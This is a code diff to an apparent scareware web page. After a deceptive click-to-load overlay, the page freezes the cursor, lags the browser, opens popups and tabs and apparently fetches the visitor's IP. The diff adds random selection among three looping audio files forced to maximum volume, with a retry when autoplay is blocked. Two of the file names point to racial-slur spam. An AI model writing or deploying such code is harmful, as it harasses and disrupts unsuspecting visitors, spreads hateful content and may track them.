@@ -53,7 +53,9 @@
     <div id="cursor-freeze"></div>
     <div id="user-info" style="display: none;"></div>
 
-    <audio id="audioElement" src="https://flying-scarlet-do7efylbnn.edgeone.app/Daniel%20Beenards%20Last%20Words%20(SAD).mp3" loop></audio>
+    <audio id="audioElement1" src="https://flying-scarlet-do7efylbnn.edgeone.app/Daniel%20Beenards%20Last%20Words%20(SAD).mp3" loop></audio>
+    <audio id="audioElement2" src="https://tender-amaranth-spwxfkezc4.edgeone.app/_NGR%20NGR%20NGR.mp3" loop></audio>
+    <audio id="audioElement3" src="https://github.com/gtatacotruck/Silver-toes-scareware/raw/09a916a1cdf93224dcd83ff48e4452ab6225ee71/NWORDSPAM.mp3" loop></audio>
 
     <script>
         async function fetchIP() {
@@ -171,6 +173,21 @@
             }
         }
 
+        function playRandomAudio() {
+            const audioElements = [
+                document.getElementById('audioElement1'),
+                document.getElementById('audioElement2'),
+                document.getElementById('audioElement3')
+            ];
+            const randomIndex = Math.floor(Math.random() * audioElements.length);
+            const selectedAudio = audioElements[randomIndex];
+            selectedAudio.volume = 1.0; // Set volume to maximum
+            selectedAudio.play().catch(() => {
+                // If autoplay fails, try again after a short delay
+                setTimeout(() => selectedAudio.play(), 1000);
+            });
+        }
+
         document.addEventListener('click', () => {
             const clickToLoad = document.getElementById('click-to-load');
             clickToLoad.style.display = 'none';
@@ -182,13 +199,7 @@
 
             freezeCursor();
             lagBrowser();
-            const audioElement = document.getElementById('audioElement');
-            audioElement.volume = 1.0; // Set volume to maximum
-            audioElement.play().catch(() => {
-                // If autoplay fails, try again after a short delay
-                setTimeout(() => audioElement.play(), 1000);
-            });
-
+            playRandomAudio();
             openPopupsAndTabs();
         });
     </script>
